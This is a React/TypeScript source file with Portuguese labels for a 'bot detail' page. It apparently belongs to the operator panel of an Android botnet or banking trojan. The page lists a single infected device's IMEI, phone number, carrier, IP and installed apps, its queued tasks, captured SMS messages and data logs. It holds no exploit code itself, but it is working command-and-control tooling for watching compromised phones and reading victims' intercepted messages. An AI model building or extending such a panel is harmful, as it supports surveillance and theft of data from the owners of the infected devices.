import { useEffect, useState } from 'react';
import { useParams } from 'react-router-dom';
import { getBotById, getTasks, getSmsList, getSmartsData } from '../api/client';
import { Bot, Task, Sms, SmartsData } from '../types';
import { formatDistanceToNow } from 'date-fns';
import Spinner from '../components/Spinner';

type Tab = 'info' | 'tasks' | 'sms' | 'logs';

export default function BotDetail() {
  const { botId } = useParams<{ botId: string }>();
  const [bot, setBot] = useState<Bot | null>(null);
  const [tasks, setTasks] = useState<Task[]>([]);
  const [sms, setSms] = useState<Sms[]>([]);
  const [logs, setLogs] = useState<SmartsData[]>([]);
  const [activeTab, setActiveTab] = useState<Tab>('info');
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    if (!botId) return;
    const load = async () => {
      setLoading(true);
      try {
        const [b, t, s, l] = await Promise.all([
          getBotById(botId),
          getTasks({ bot_id: botId }),
          getSmsList({ bot_id: botId }),
          getSmartsData({ bot_id: botId }),
        ]);
        setBot(b); setTasks(t); setSms(s); setLogs(l);
      } catch (e) {
        console.error(e);
      } finally {
        setLoading(false);
      }
    };
    load();
  }, [botId]);

  if (loading) return <Spinner size="lg" />;
  if (!bot) return <div className="text-center py-10">Bot não encontrado.</div>;

  const tabLabels: Record<Tab, string> = {
    info: 'Informações',
    tasks: 'Tarefas',
    sms: 'SMS',
    logs: 'Logs',
  };

  return (
    <div>
      <h1 className="text-2xl font-bold mb-6 text-gray-900 dark:text-white">Bot #{bot.bot_id}</h1>

      <div className="flex space-x-4 border-b dark:border-gray-700 mb-6">
        {Object.entries(tabLabels).map(([key, label]) => (
          <button
            key={key}
            onClick={() => setActiveTab(key as Tab)}
            className={`py-2 px-4 text-sm font-medium ${
              activeTab === key
                ? 'border-b-2 border-indigo-600 text-indigo-600'
                : 'text-gray-500 dark:text-gray-400 hover:text-gray-700'
            }`}
          >
            {label}
          </button>
        ))}
      </div>

      {activeTab === 'info' && (
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 bg-white dark:bg-gray-800 rounded-lg p-6">
          <InfoItem label="IMEI" value={bot.imei} />
          <InfoItem label="Número" value={bot.number} />
          <InfoItem label="País" value={bot.country} />
          <InfoItem label="Idioma" value={bot.lang} />
          <InfoItem label="Android" value={bot.android} />
          <InfoItem label="Modelo" value={bot.model} />
          <InfoItem label="Operadora" value={bot.operator} />
          <InfoItem label="IP" value={bot.ip} />
          <InfoItem label="Uptime" value={`${bot.uptime} segundos`} />
          <InfoItem label="Última atividade" value={formatDistanceToNow(new Date(bot.last_seen), { addSuffix: true })} />
          <InfoItem label="Registrado em" value={formatDistanceToNow(new Date(bot.registered), { addSuffix: true })} />
          <InfoItem label="Aplicativos" value={bot.apps.split('|').join(', ')} />
        </div>
      )}

      {activeTab === 'tasks' && (
        <div className="bg-white dark:bg-gray-800 rounded-lg p-6 overflow-x-auto">
          <table className="min-w-full divide-y divide-gray-200 dark:divide-gray-700">
            <thead className="bg-gray-50 dark:bg-gray-700">
              <tr><th>ID</th><th>Tipo</th><th>Dados</th><th>Status</th></tr>
            </thead>
            <tbody className="divide-y divide-gray-200 dark:divide-gray-700">
              {tasks.map(task => (
                <tr key={task.id}>
                  <td className="px-6 py-4">{task.id}</td>
                  <td className="px-6 py-4">{task.task_type}</td>
                  <td className="px-6 py-4">{task.data}</td>
                  <td className="px-6 py-4">{task.status}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      {activeTab === 'sms' && (
        <div className="bg-white dark:bg-gray-800 rounded-lg p-6 overflow-x-auto">
          <table className="min-w-full divide-y divide-gray-200 dark:divide-gray-700">
            <thead className="bg-gray-50 dark:bg-gray-700">
              <tr><th>ID</th><th>Número</th><th>Mensagem</th><th>Data</th></tr>
            </thead>
            <tbody className="divide-y divide-gray-200 dark:divide-gray-700">
              {sms.map(s => (
                <tr key={s.id}>
                  <td className="px-6 py-4">{s.id}</td>
                  <td className="px-6 py-4">{s.number}</td>
                  <td className="px-6 py-4">{s.msg}</td>
                  <td className="px-6 py-4">{formatDistanceToNow(new Date(Number(s.time) * 1000), { addSuffix: true })}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      {activeTab === 'logs' && (
        <div className="bg-white dark:bg-gray-800 rounded-lg p-6 overflow-x-auto">
          <table className="min-w-full divide-y divide-gray-200 dark:divide-gray-700">
            <thead className="bg-gray-50 dark:bg-gray-700">
              <tr><th>ID</th><th>Smart ID</th><th>Data</th><th>Conteúdo</th></tr>
            </thead>
            <tbody className="divide-y divide-gray-200 dark:divide-gray-700">
              {logs.map(log => (
                <tr key={log.id}>
                  <td className="px-6 py-4">{log.id}</td>
                  <td className="px-6 py-4">{log.smart_id}</td>
                  <td className="px-6 py-4">{formatDistanceToNow(new Date(Number(log.time) * 1000), { addSuffix: true })}</td>
                  <td className="px-6 py-4 max-w-xs truncate">{log.data}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
}

function InfoItem({ label, value }: { label: string; value: string | number }) {
  return (
    <div>
      <p className="text-sm text-gray-500 dark:text-gray-400">{label}</p>
      <p className="text-base text-gray-900 dark:text-white">{value}</p>
    </div>
  );
}
